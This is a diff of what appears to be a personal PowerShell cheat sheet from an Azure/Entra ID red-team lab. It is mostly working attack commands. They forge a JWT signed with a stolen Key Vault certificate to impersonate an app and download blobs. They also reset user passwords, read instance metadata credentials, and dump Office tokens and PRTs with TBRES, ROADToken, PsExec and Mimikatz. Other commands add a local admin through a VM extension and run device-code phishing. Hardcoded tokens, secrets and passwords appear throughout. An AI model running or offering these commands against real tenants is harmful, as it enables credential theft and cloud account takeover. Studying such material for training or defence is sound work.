+    param($kvURI, $GISAppKeyVaultToken, $keyName)
+
+    $uri          = "$kvURI/certificates?api-version=7.3"
+    $httpResponse = Invoke-WebRequest -Uri $uri -Headers @{
+        'Authorization' = "Bearer $GISAppKeyVaultToken"
+    }
+    $certs   = $httpResponse.Content | ConvertFrom-Json
+    $certUri = $certs.Value | Where-Object { $_.id -like "*$keyName*" }
+    Write-Output $certUri
+
+    $httpResponse = Invoke-WebRequest -Uri "$($certUri.id)?api-version=7.3" -Headers @{
+        'Authorization' = "Bearer $KVAT"
+    }
+    return $httpResponse.Content | ConvertFrom-Json
+}
+
+$AKVCertificate = Get-AKVCertificate `
+    -kvURI              'https://asegfdnurqpj3343460.vault.azure.net' `
+    -GISAppKeyVaultToken $KVAT `
+    -keyName            'AS-lsguyqwnaj3343458'
+$AKVCertificate | Format-List *
+
+# ---- Build and sign JWT using AKV cert, then request ARM token ----
+# Reference: https://www.huntandhackett.com/blog/researching-access-tokens-for-fun-and-knowledge
+
+$DataAnalyticsAppID = 'f23a808b-6a01-4fb2-bfd9-bdb3e8390421'
+$tenantID           = 'd6bd5a42-7c65-421c-ad23-a25a5d5fa57f'
+$audience           = "https://login.microsoftonline.com/$tenantID/oauth2/token"
+
+$startDate              = (Get-Date "1970-01-01T00:00:00Z").ToUniversalTime()
+$JWTExpirationTimeSpan  = (New-TimeSpan -Start $startDate -End (Get-Date).ToUniversalTime().AddMinutes(2)).TotalSeconds
+$JWTExpiration          = [math]::Round($JWTExpirationTimeSpan, 0)
+$NotBeforeTimeSpan      = (New-TimeSpan -Start $startDate -End (Get-Date).ToUniversalTime()).TotalSeconds
+$NotBefore              = [math]::Round($NotBeforeTimeSpan, 0)
+
+$jwtHeader = @{
+    alg = "RS256"
+    typ = "JWT"
+    x5t = $AKVCertificate.x5t[0]
+}
+$jwtPayLoad = @{
+    aud = $audience
+    exp = $JWTExpiration
+    iss = $DataAnalyticsAppID
+    jti = [guid]::NewGuid()
+    nbf = $NotBefore
+    sub = $DataAnalyticsAppID
+}
+
+$jwtHeaderBytes  = [System.Text.Encoding]::UTF8.GetBytes(($jwtHeader  | ConvertTo-Json))
+$jwtPayloadBytes = [System.Text.Encoding]::UTF8.GetBytes(($jwtPayLoad | ConvertTo-Json))
+$b64JwtHeader    = [System.Convert]::ToBase64String($jwtHeaderBytes)
+$b64JwtPayload   = [System.Convert]::ToBase64String($jwtPayloadBytes)
+
+$unsignedJwt      = "$b64JwtHeader.$b64JwtPayload"
+$unsignedJwtBytes = [System.Text.Encoding]::UTF8.GetBytes($unsignedJwt)
+$hasher           = [System.Security.Cryptography.HashAlgorithm]::Create('sha256')
+$jwtSha256Hash    = $hasher.ComputeHash($unsignedJwtBytes)
+$jwtSha256HashB64 = [Convert]::ToBase64String($jwtSha256Hash) -replace '\+','-' -replace '/','_' -replace '='
+
+# Sign via AKV
+$uri     = "$($AKVCertificate.kid)/sign?api-version=7.3"
+$headers = @{
+    'Authorization' = "Bearer $GISAppKeyVaultToken"
+    'Content-Type'  = 'application/json'
+}
+$response  = Invoke-RestMethod -Uri $uri -UseBasicParsing -Method POST -Headers $headers -Body (
+    [ordered]@{ alg = 'RS256'; value = $jwtSha256HashB64 } | ConvertTo-Json
+)
+$signedJWT = "$unsignedJwt.$($response.value)"
+
+# Request ARM token using signed JWT
+$uri     = "https://login.microsoftonline.com/$tenantID/oauth2/v2.0/token"
+$headers = @{ 'Content-Type' = 'application/x-www-form-urlencoded' }
+$response = Invoke-RestMethod -Uri $uri -UseBasicParsing -Method POST -Headers $headers -Body (
+    [ordered]@{
+        client_id              = $DataAnalyticsAppID
+        client_assertion       = $signedJWT
+        client_assertion_type  = 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer'
+        scope                  = 'https://management.azure.com/.default'
+        grant_type             = 'client_credentials'
+    }
+)
+$DataAnalyticsAppToken = $response.access_token
+Connect-AzAccount -AccessToken $DataAnalyticsAppToken -AccountId $DataAnalyticsAppID
+
+# Request Storage token using signed JWT
+$response = Invoke-RestMethod -Uri $uri -UseBasicParsing -Method POST -Headers $headers -Body (
+    [ordered]@{
+        client_id              = $DataAnalyticsAppID
+        client_assertion       = $signedJWT
+        client_assertion_type  = 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer'
+        scope                  = 'https://storage.azure.com/.default'
+        grant_type             = 'client_credentials'
+    }
+)
+$DataAnalyticsAppStorageToken = $response.access_token
+
+# List containers in storage account
+$URL = "https://oildatastore.blob.core.windows.net/?comp=list"
+$Params = @{
+    URI     = $URL
+    Method  = "GET"
     Headers = @{
-        'Authorization' = "Bearer $Token"
-                }
+        "Content-Type"    = "application/json"
+        "Authorization"   = "Bearer $DataAnalyticsAppStorageToken"
+        "x-ms-version"    = "2017-11-09"
+        "accept-encoding" = "gzip, deflate"
     }
-    (Invoke-RestMethod @RequestParams).value 
-    # if you found Administrative unit, pass it's id : 
-    Get-AzureADMSAdministrativeUnit -Id e1e26d93-163e-42a2-a46e-1b7d52626395
-    # Get administrative unit members , id from display name of previous command
-    Get-AzureADMSAdministrativeUnitMember -Id e1e26d93-163e42a2-a46e-1b7d52626395
-    # Get which user/group/object has out role over administrative unit member
-    Get-AzureADMSScopedRoleMembership -Id e1e26d93-163e-42a2-a46e-1b7d52626395 | fl
-    # Reset password for certain user
-    $password = "VM@Contributor@123@321" | ConvertTo-SecureString  -AsPlainText -Force
-    (Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq "VMContributorx@defcorphq.onmicrosoft.com"}).ObjectId | Set-AzureADUserPassword -Password $Password -Verbose
-    
-    # AD joined device:
-    # Check if machine joined 
-        dsregcmd /status
-    # Get user data from the joined machine:
-        $userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
-        [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
-    # Another way
-        (iwr http://169.254.169.254/latest/user-data -UseBasicParsing).RawContent
-    # check if EC2 
-        (iwr http://169.254.169.254/latest/meta-data/hostname -UseBasicParsing).Content
-        (iwr http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance -UseBasicParsing).Content
-    # Get proccesses with username and id,procName
-        (Get-Process -IncludeUserName ) | % {[PSCustomObject]@{
-            procName = $_.ProcessName
-            username = $_.UserName
-            Id = $_.Id
-        }
-        }
-    # Dump word/Powerpoint/OneDrive AT
-        # Get all the tools to dump it from disk
-        Copy-Item -ToSession $ec2instance -Path C:\AzAD\Tools\TBRES\ -Destination C:\Users\Public\student61 -Recurse -Verbose
-        Copy-Item -ToSession $ec2instance -Path C:\AzAD\Tools\Invoke-RunasCs.ps1 -Destination C:\Users\Public\student61 -Verbose
-        # Enter PS session and run it , we need admin creds, we can get it from user data if there
-        . C:\Users\Public\student61\Invoke-RunasCs.ps1
-        Invoke-RunasCs -Username administrator -Password '%dlTKmropc!1l3I(o1j5834H$0VZ))2p' -Command C:\Users\Public\student61\TBRES.exe
-        # in System32, the decrypted token, search largest latest file 
-        ls C:\Windows\System32\*.decrypted |sort -Property LastWriteTime -Descending
-        # Cat each file and check it's JWT, if it's aud points to graph.microsoft.com to get Graph AT. 
-    # After getting AT, list one drive accessible files 
-    $GraphAccessToken ="..."
-    $Params = @{
-        "URI"     = "https://graph.microsoft.com/beta/me/drive/root/children"
-        "Method"  = "GET"
-        "Headers" = @{
-            "Authorization" = "Bearer $GraphAccessToken"
-            "Content-Type"  = "application/json"
-            }
-        }
-    $Result = Invoke-RestMethod @Params -UseBasicParsing
-    $Result.value
-    # if you found certain name interesting, get it's download url 
-    (($Result.value) | where{$_.Name -eq 'accessingplantinfo.ps1'}).'@microsoft.graph.downloadUrl'
-    # open browser and download it
-    # List All resources permission, e.g. VM
-        $FormatEnumerationLimit =-1 # No truncation (No ....)
-        $Resources = Get-AzResource
-        $Token = (Get-AzAccessToken).Token
-        foreach($Resource in $Resources)
-        {
-            $ID = $Resource.Id
-            $URI = "https://management.azure.com/$ID/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
-            $RequestParams = @{
-                Method = 'GET'
-                Uri = $URI
-                Headers = @{
-                    'Authorization' = "Bearer $Token"
-                    }
-                    ContentType = "application/json"
-                   
-            }
-            $Result = Invoke-RestMethod @RequestParams
-            $ResourceName = $Resource.Name
-            Write-Output "ResourceName - $ResourceName"
-            Write-Output "Permissions -" $Result.value | fl *
-        }
-    # Access user inbox emails :
-    Connect-MgGraph -AccessToken ($AccessToken | ConvertTo-SecureString -AsPlainText -Force)
-    Get-MgUserMessage -UserId CaseyRSawyer@oilcorporation.onmicrosoft.com |fl
-    # List CERTIAN resource permission, e.g. VM
-    $Token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6ImtXYmthYTZxczh3c1RuQndpaU5ZT2hIYm5BdyIsImtpZCI6ImtXYmthYTZxczh3c1RuQndpaU5ZT2hIYm5BdyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuY29yZS53aW5kb3dzLm5ldC8iLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8yZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYvIiwiaWF0IjoxNzA4NTk3NzcwLCJuYmYiOjE3MDg1OTc3NzAsImV4cCI6MTcwODYwMjgxNCwiYWNyIjoiMSIsImFpbyI6IkFUUUF5LzhXQUFBQWM5bjY5YktrTmJWcFJQU0JBbzc4ZzhmeWtMY09UQXNGcFBBWE0rRlNnNU9OQjRxSUh2YWtOcVo0THo4MXl1QmMiLCJhbXIiOlsicHdkIl0sImFwcGlkIjoiMTk1MGEyNTgtMjI3Yi00ZTMxLWE5Y2YtNzE3NDk1OTQ1ZmMyIiwiYXBwaWRhY3IiOiIwIiwiZ3JvdXBzIjpbIjE1NGE5MzI2LWZmZjEtNDYzZC04ZTJiLWRkMjE3YjZmNjA2NCJdLCJpZHR5cCI6InVzZXIiLCJpcGFkZHIiOiI1MS4yMTAuMS4yMzkiLCJuYW1lIjoiU2FtIEMuIEdyYXkiLCJvaWQiOiJlNDQzNTgxYi05NTQ3LTQ2MWYtYjU2Zi1hZGYyYTIwN2QwMmMiLCJwdWlkIjoiMTAwMzIwMDEyMTlGRjQ1QSIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0a1pJZjNrQXV0ZFB1a1Bhd2ZqMk1CUEVBTEUuIiwic2NwIjoidXNlcl9pbXBlcnNvbmF0aW9uIiwic3ViIjoiU1plOGJoTy1OeHFLWi01T1dkMXUzdVlxS0FILUIycXNYR2FNQTE2RVk2dyIsInRpZCI6IjJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNiIsInVuaXF1ZV9uYW1lIjoic2FtY2dyYXlAZGVmY29ycGhxLm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6InNhbWNncmF5QGRlZmNvcnBocS5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiJoTW1UYjRKN25rdUtMWm9wMUZ4YUFBIiwidmVyIjoiMS4wIiwid2lkcyI6WyJiNzlmYmY0ZC0zZWY5LTQ2ODktODE0My03NmIxOTRlODU1MDkiXSwieG1zX2NhZSI6IjEiLCJ4bXNfY2MiOlsiQ1AxIl0sInhtc19maWx0ZXJfaW5kZXgiOlsiMTEyIl0sInhtc19yZCI6IjAuNDJMbFlCUmlMQUFBIiwieG1zX3NzbSI6IjEiLCJ4bXNfdGNkdCI6MTYxNTM3NTYyOX0.Rkc0y9WEEjvbFxcbpV-QKcTASAOpUH1qivl850z1ts-5vkEOmp2V1jVo7Y6hZEq__d8U1MvXvvs_vqp-h1WXIZHYVu9JxAgimEhyPEuxt6kiXa0RqctEjW3SU1MpWKfm67KiYT2wbAF9csLmaY0lXSvlgVVSLvNnHVH7XsSRM3rTTRmwnC5R3ik_bGAOYCDrXWYmGiZBU2K6ya9-6STuAjiIyyB2UA27qcXecnc1AGXoeL3CfvuMf0GO_4OMXVGdbw3e6m8w1OmYuZq1p-T3nipZHXFNHDLfqigaAonZaKv11AkDkzdFv-X8D_xuzMpj0vE0D61PMYjjP9aoOBALVA"
-    $URI = 'https://management.azure.com/{ResourceID}/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'
-    $RequestParams = @{
-        Method = 'GET'
-        Uri = $URI
-        Headers = @{
-        'Authorization' = "Bearer $Token"
-        }
+}
+Invoke-RestMethod @Params -UseBasicParsing
+
+# ============================================================
+# STORAGE ACCOUNT PERMISSIONS
+# ============================================================
+
+$Access_Token       = (Get-AzAccessToken).Token
+$storageAccount     = Get-AzStorageAccount
+$SubscriptionID     = (Get-AzSubscription).Id
+$ResourceGroupName  = $storageAccount.ResourceGroupName
+$StorageAccountName = $storageAccount.StorageAccountName
+$URI = "https://management.azure.com/subscriptions/$SubscriptionID/resourceGroups/$ResourceGroupName/providers/Microsoft.Storage/storageAccounts/$StorageAccountName/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
+$RequestParams = @{
+    Method  = 'GET'
+    Uri     = $URI
+    Headers = @{ 'Authorization' = "Bearer $Access_Token" }
+}
+(Invoke-RestMethod @RequestParams).value | Format-List *
+
+# ============================================================
+# BLOB STORAGE — FILE OPERATIONS
+# ============================================================
+
+# List files in 'certificates' container
+$URL = "https://oildatastore.blob.core.windows.net/certificates?restype=container&comp=list"
+$Params = @{
+    URI     = $URL
+    Method  = "GET"
+    Headers = @{
+        "Content-Type"    = "application/json"
+        "Authorization"   = "Bearer $DataAnalyticsAppStorageToken"
+        "x-ms-version"    = "2017-11-09"
+        "accept-encoding" = "gzip, deflate"
     }
-    (Invoke-RestMethod @RequestParams).value 
-    # Get VM extension details 
-    Get-AzVMExtension -ResourceGroupName "Research" -VMName "infradminsrv"
-    # If you have write permission over vm extension, we can create a local user as admin
-    Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany WestCentral" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users student17 Stud17Password@123 /add /Y; net localgroup administrators student17 /add"}'
-    
-    # Extracting PRT
-    # Getting Nonce (From any machine)
-        $TenantId = "2d50cb29-5f7b-48a4-87ce-fe75a941adb6"
-        $URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"
-        $Params = @{
-            "URI" = $URL
-            "Method" = "POST"
-        }
-        $Body = @{
-        "grant_type" = "srv_challenge"
-        }
-        $Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
-        $Result.Nonce
-    # Utilize the nonce 
-    C:\Users\student17\Documents\ROADToken.exe $Result.Nonce
-    # Or in another session 
-    Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\ROADToken.exe -Destination C:\Users\student17\Documents -Verbose
-    Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\PsExec64.exe -Destination C:\Users\student17\Documents -Verbose
-    Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\SessionExecCommand.exe -Destination C:\Users\student17\Documents -Verbose
-    # ignore any error execept argument is too long    
-    Invoke-Command -Session $infradminsrv -ScriptBlock{C:\Users\student17\Documents\PsExec64.exe -accepteula -s "cmd.exe" " /c C:\Users\student17\Documents\SessionExecCommand.exe MichaelMBarron C:\Users\student17\Documents\ROADToken.exe AwABAAEAAAACAOz_BQD0_23rEiaJgjV8RK-Kg19JFMskwUpn2zuPSHBBvCOjiwqw3UP_ysqXPnuELoG8MvwBBR_zV3f60eQSypbGQJWajXcgAA > C:\Temp\PRT17.txt"}
-    Invoke-Command -Session $infradminsrv -ScriptBlock{cat C:\Temp\PRT17.txt}
-    Invoke-Command -Session $infradminsrv -ScriptBlock{. C:\Users\student17\Documents\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command ' "privilege::debug" "sekurlsa::cloudap" "exit"'}    
-    # Extract PRT
-    Get-AADIntUserPRTToken
-    
+}
+$XML = Invoke-RestMethod @Params -UseBasicParsing
+# Remove BOM and list blob names
+$XML.TrimStart([char]0xEF, [char]0xBB, [char]0xBF) |
+    Select-Xml -XPath "//Name" |
+    ForEach-Object { $_.node.InnerXML }
 
-
-    # SP creds utilization  
-    # Secret
-    $passwd = ConvertTo-SecureString "ylz8Q~kasdfasdfasfdasdfasZZZZdfas" -AsPlainText -Force
-    # App ID
-    $creds = New-Object System.Management.Automation.PSCredential ("ebf26192-9eb1-47a8-8554-739ef769b00a", $passwd)
-    Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant 4e7a1151-36d0-457e-b489-729cf0fb315a
-    # Entra id authentication 
-    Connect-MgGraph -ClientSecretCredential $creds -TenantId d6bd5a42-7c65-421c-ad23-a25a5d5fa57f
-    # Dynamic group abuse: 
-    Set-AzureADUser -ObjectId  5dec6744-f973-4fb7-ab07-2542d41dfb75  -OtherMails vendor17@defcorpextcontractors.onmicrosoft.com  -Verbose
-    
-    # Enumerate all the applications that has application proxy configured
-    Get-AzureADApplication | % {try{ Get-AzureADApplicationProxyApplication -ObjectId $_.ObjectID;$_.DisplayName;$_.ObjectID}catch{}}
-    # Check users who has access to app with app proxy:
-        Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq "Finance Management System"}
-        # Take object id of the app and use it in this:
-        . C:\AzAD\Tools\Get-ApplicationProxyAssignedUsersAndGroups.ps1
-        Get-ApplicationProxyAssignedUsersAndGroups -ObjectId ec350d24-e4e4-4033-ad3f-bf60395f0362
-
-####### CARTE ##########
-    # Device Code Phishing
-        Import-Module C:\AzAD\Tools\TokenTactics-main\TokenTactics.psd1
-        Get-AzureToken -Client MSGraph
-            # Afte get the device code and authenticate, we can get it's access token using :
-            $response.access_token
-            # If access token expired, you get access token from below : 
-            Invoke-RefreshGraphTokens -refreshToken $response.refresh_token -tenantid d6bd5a42-7c65-421c-ad23-a25a5d5fa57f
-            # Tenant id , you can get it from the expired access token in jwt: 
-
-
-    # FOCI MS graph access token   
-    $GraphAT = (Invoke-RefreshToMSGraphToken  -domain oilcorporation.onmicrosoft.com -refreshToken $tokens.refresh_token).access_token
-
-    # Get permission for certain keyvault : 
-    $KeyVault = Get-AzKeyVault
-    $SubscriptionID = (Get-AzSubscription).Id
-    $ResourceGroupName = $KeyVault.ResourceGroupName
-    $KeyVaultName = $KeyVault.VaultName
-    $URI = "https://management.azure.com/subscriptions/$SubscriptionID/resourceGroups/$ResourceGroupName/providers/Microsoft.KeyVault/vaults/$KeyVaultName/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
-    $RequestParams = @{
-       Method = 'GET'
-       Uri = $URI
-       Headers = @{
-        'Authorization' = "Bearer $Access_Token"
-        }
+# Download a specific blob file
+$URL = "https://oildatastore.blob.core.windows.net/certificates/CertAttachment61.txt"
+$Params = @{
+    URI     = $URL
+    Method  = "GET"
+    Headers = @{
+        "Content-Type"    = "application/json"
+        "Authorization"   = "Bearer $DataAnalyticsAppStorageToken"
+        "x-ms-version"    = "2017-11-09"
+        "accept-encoding" = "gzip, deflate"
     }
-    $Permissions = (Invoke-RestMethod @RequestParams).value
-    $Permissions | fl *
-    
-    
-    # Getting Apps that has secrets or certs, save them as XML
-        $GraphAccessToken = $AccessToken
-        $URI = "https://graph.microsoft.com/v1.0/Applications"
-        $RequestParams = @{
-            Method = 'GET'
-            Uri = $URI
-            Headers = @{
-            'Authorization' = "Bearer $GraphAccessToken"
-             }
-        }
-        $Applications = (Invoke-RestMethod @RequestParams).value
+}
+$cert = Invoke-RestMethod @Params -UseBasicParsing
+$cert
 
-        $ApplicationsDetails = [PSCustomObject]@{
-        Applications = @()}
-        foreach($Application in $Applications)
-        {
-            $applicationObject = [PSCustomObject]@{
-            DisplayName = $Application.displayName
-            AppId = $Application.appId
-            CreatedDateTime = $Application.createdDateTime
-            ID = $Application.id
-            keyCredentials = $Application.keyCredentials
-            passwordCredentials = $Application.passwordCredentials
-        }
-        $ApplicationsDetails.Applications += $applicationObject
-        }
-        $ApplicationsDetails.Applications
-        # Save the content 
-        $ApplicationsDetails.Applications | Export-Clixml -Path C:\AzAD\Tools\OilCorpApplications.xml
+# Write cert to disk
+$secretByte = [Convert]::FromBase64String($cert)
+[System.IO.File]::WriteAllBytes("C:\AzAD\Tools\spcert.pfx", $secretByte)
 
-    # if you got a cert from anywhere (e.g. keyvault), you can check if any app/SP utilizing it
-        # Get Cert from keyvault and store it to disk 
-        $secret = Get-AzKeyVaultSecret -VaultName GISAppvault -Name GISAppCert -AsPlainText
-        $secretByte = [Convert]::FromBase64String($secret)
-        [System.IO.File]::WriteAllBytes("C:\AzAD\Tools\StorageCert.pfx", $secretByte)
-        # Get Cert content and compare it with cert thump from tenant app we enumerated
-        $clientCertificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 -ArgumentList 'C:\AzAD\Tools\StorageCert.pfx'
-        Import-Clixml C:\AzAD\Tools\OilCorpApplications.xml | Where {$_.keyCredentials.customKeyIdentifier -eq $clientCertificate.Thumbprint}
+# Match cert thumbprint against app key credentials
+$spCertificate = New-Object `
+    System.Security.Cryptography.X509Certificates.X509Certificate2 `
+    -ArgumentList 'C:\AzAD\Tools\spcert.pfx'
+Import-Clixml C:\AzAD\Tools\OilCorpApplications.xml |
+    Where-Object { $_.keyCredentials.customKeyIdentifier -eq $spCertificate.Thumbprint }
 
-    # ِExtract Key vault AT
-        $scope = 'https://vault.azure.net/.default'
-        $refresh_token = $tokens.refresh_token
-        $GrantType = 'refresh_token'
-        $body=@{
-            "client_id" = $ClientID
-            "scope" = $Scope
-            "refresh_token" = $refresh_token
-            "grant_type" = $GrantType
-        }
-        $KeyVaultAccessToken = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body
-        $KeyVaultAccessToken
+# ---- Modify blob tags (e.g. to satisfy ABAC condition) ----
 
-    # Connect again : 
-        Connect-AzAccount -AccessToken $accesstoken -KeyVaultAccessToken $keyvaultaccesstoken.access_token -AccountId ThomasLWright@oilcorporation.onmicrosoft.com
-
-    # Get Key vault cert 
-    Get-AzKeyVaultCertificate -VaultName GISAppvault
-    $secret = Get-AzKeyVaultSecret -VaultName GISAppvault -Name GISAppCert -AsPlainText
-    $secretByte = [Convert]::FromBase64String($secret)
-    [System.IO.File]::WriteAllBytes("C:\AzAD\Tools\GISAppcert.pfx", $secretByte)
-    
-    # Auth with cert and Get AT: 
-        . .\New-AccessToken.ps1
-        $secret = Get-Content .\CertificateBase64.txt
-        $secretByte = [Convert]::FromBase64String($secret)
-        [System.IO.File]::WriteAllBytes("C:\AzAD\Tools\StorageCert.pfx", $secretByte)
-        $clientCertificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 -ArgumentList 'C:\AzAD\Tools\StorageCert.pfx'
-        $StorageToken = New-AccessToken -clientCertificate $clientCertificate -tenantID  2e0d024c-5e44-47f7-b4b8-42126b542e36 -appID 578e381a-8f03-4cae-8b3e-559d02023ee1 -scope 'https://management.azure.com/.default'
-        $GraphToken = New-AccessToken -clientCertificate $clientCertificate -tenantID  2e0d024c-5e44-47f7-b4b8-42126b542e36 -appID 578e381a-8f03-4cae-8b3e-559d02023ee1 -scope 'https://graph.microsoft.com/.default'
-        $AadToken = New-AccessToken -clientCertificate $clientCertificate -tenantID  2e0d024c-5e44-47f7-b4b8-42126b542e36 -appID 578e381a-8f03-4cae-8b3e-559d02023ee1 -scope 'https://graph.windows.net/.default'
-        Connect-AzureAD -AadAccessToken $AadToken -AccountId 578e381a-8f03-4cae-8b3e-559d02023ee1 -TenantId 2e0d024c-5e44-47f7-b4b8-42126b542e36
-        Connect-AzAccount -AccessToken $StorageToken -AccountId 578e381a-8f03-4cae-8b3e-559d02023ee1
-        [X509Certificate]$clientCertificate2 = Get-PfxCertificate -FilePath C:\AzAD\Tools\StorageCert.pfx
-        Connect-MgGraph -Certificate $clientCertificate2 -ClientId 578e381a-8f03-4cae-8b3e-559d02023ee1 -TenantId 2e0d024c-5e44-47f7-b4b8-42126b542e36
-
-    # Get cert meta data and sign it using JWT
-        # 1.Get Cert Meta data from keyvault 
-            # Get Key vault all certs metadata 7.4 version , asegfdnurqpj3343460== key vault name
-                $URI = "https://asegfdnurqpj3343460.vault.azure.net/certificates?api-version=7.4"
-                $RequestParams = @{
-                    Method = 'GET'
-                    Uri = $URI
-                    Headers = @{
-                    'Authorization' = "Bearer $KVAT"
-                    }
-                    ContentType = "application/json"
-                    }
-                $KVInfo = (Invoke-RestMethod @RequestParams).value
-                $KVInfo | fl *
-                
-            # $GISAppMgmtToken = New-AccessToken -clientCertificate $clientCertificate -tenantID d6bd5a42-7c65-421c-ad23-a25a5d5fa57f -appID 2b7c28bd-def1-415a-b407-41627de6e8f1 -scope 'https://management.azure.com/.default'
-            # $GISAppKeyVaultToken = New-AccessToken -clientCertificate $clientCertificate -tenantID d6bd5a42-7c65-421c-ad23-a25a5d5fa57f -appID 2b7c28bd-def1-415a-b407-41627de6e8f1 -scope 'https://vault.azure.net/.default'
-            # Get Vault cert meta data (more details), then using 7.3 API Version 
-                function Get-AKVCertificate($kvURI, $GISAppKeyVaultToken, $keyName) {
-                        # Get all certs
-                        $uri = "$($kvURI)/certificates?api-version=7.3"
-                        $httpResponse = Invoke-WebRequest -Uri $uri -Headers @{ 'Authorization' =
-                        "Bearer $($GISAppKeyVaultToken)" }
-                        $certs = $httpResponse.Content | ConvertFrom-Json
-                        #Write-Output $certs
-                        # Filter our own cert
-                        $certUri = $certs.Value | where {$_.id -like "*$($keyName)*"}
-                        Write-Output $certUri
-                        # Get cerrt details 
-                        # https://keyVaultName.vault.azure.net/certificates/KertName
-                        $httpResponse = Invoke-WebRequest -Uri "$($certUri.id)?api-version=7.3" -Headers @{ 'Authorization' = "Bearer $($KVAT)" }
-                        return $httpResponse.Content | ConvertFrom-Json
-                    }
-                $AKVCertificate = Get-AKVCertificate -kvURI 'https://asegfdnurqpj3343460.vault.azure.net' -GISAppKeyVaultToken $KVAT -keyName 'AS-lsguyqwnaj3343458'
-                $AKVCertificate | fl *
-                    
-        # 2.Create a JWT and sing it utilizing $AKVCertificate cert meta data
-            # Taken from https://www.huntandhackett.com/blog/researching-access-tokensfor-fun-and-knowledge
-            # Require : $GISAppKeyVaultToken, $AKVCertificate.x5t[0] , $AKVCertificate.kid,$tenantID
-            $DataAnalyticsAppID = 'f23a808b-6a01-4fb2-bfd9-bdb3e8390421'
-            $tenantID = 'd6bd5a42-7c65-421c-ad23-a25a5d5fa57f'
-            $audience = "https://login.microsoftonline.com/$tenantID/oauth2/token"
-            # JWT request should be valid for max 2 minutes.
-            $StartDate = (Get-Date "1970-01-01T00:00:00Z" ).ToUniversalTime()
-            $JWTExpirationTimeSpan = (New-TimeSpan -Start $StartDate -End (Get-Date).ToUniversalTime().AddMinutes(2)).TotalSeconds
-            $JWTExpiration = [math]::Round($JWTExpirationTimeSpan,0)
-
-            # Create a NotBefore timestamp.
-            $NotBeforeExpirationTimeSpan = (New-TimeSpan -Start $StartDate -End ((Get-Date).ToUniversalTime())).TotalSeconds
-            $NotBefore = [math]::Round($NotBeforeExpirationTimeSpan,0)
-            # Create JWT header
-            $jwtHeader = @{
-            'alg' = "RS256" # Use RSA encryption and SHA256 as hashing algorithm
-            'typ' = "JWT" # We want a JWT
-            'x5t' = $AKVCertificate.x5t[0] # The pubkey hash we received from Azure Key Vault
-            }
-            # Create the payload
-            $jwtPayLoad = @{
-            'aud' = $audience # Points to oauth token request endpoint for your tenant
-            'exp' = $JWTExpiration # Expiration of JWT request
-            'iss' = $DataAnalyticsAppID # The AppID for which we request a token for
-            'jti' = [guid]::NewGuid() # Random GUID
-            'nbf' = $NotBefore # This should not be used before this timestamp
-            'sub' = $DataAnalyticsAppID # Subject
-                }
-            # Convert header and payload to json and to base64
-            $jwtHeaderBytes = [System.Text.Encoding]::UTF8.GetBytes(($jwtHeader | ConvertTo-Json))
-            $jwtPayloadBytes = [System.Text.Encoding]::UTF8.GetBytes(($jwtPayLoad | ConvertTo-Json))
-            $b64JwtHeader = [System.Convert]::ToBase64String($jwtHeaderBytes)
-            $b64JwtPayload = [System.Convert]::ToBase64String($jwtPayloadBytes)
-            # Concat header and payload to create an unsigned JWT and compute a Sha256 hash
-            $unsignedJwt = $b64JwtHeader + "." + $b64JwtPayload
-            $unsignedJwtBytes = [System.Text.Encoding]::UTF8.GetBytes($unsignedJwt)
-            $hasher =
-            [System.Security.Cryptography.HashAlgorithm]::Create('sha256')
-            $jwtSha256Hash = $hasher.ComputeHash($unsignedJwtBytes)
-            $jwtSha256HashB64 = [Convert]::ToBase64String($jwtSha256Hash) -replace '\+','-' -replace '/','_' -replace '='
-            # Sign the sha256 of the unsigned JWT using the certificate in Azure Key Vault
-            $uri = "$($AKVCertificate.kid)/sign?api-version=7.3"
-            $headers = @{
-            'Authorization' = "Bearer $GISAppKeyVaultToken"
-            'Content-Type' = 'application/json'
-            }
-            $response = Invoke-RestMethod -Uri $uri -UseBasicParsing -Method POST -Headers $headers -Body (([ordered] @{
-            'alg' = 'RS256'
-            'value' = $jwtSha256HashB64
-            }) | ConvertTo-Json)
-            $signature = $response.value
-            # Concat the signature to the unsigned JWT
-            $signedJWT = $unsignedJwt + "." + $signature
-
-            # Request ARM Token using the jwt token
-            $uri = "https://login.microsoftonline.com/$tenantID/oauth2/v2.0/token"
-            $headers = @{'Content-Type' = 'application/x-www-form-urlencoded'}
-            $response = Invoke-RestMethod -Uri $uri -UseBasicParsing -Method POST -Headers $headers -Body ([ordered]@{
-                'client_id' = $DataAnalyticsAppID
-                'client_assertion' = $signedJWT
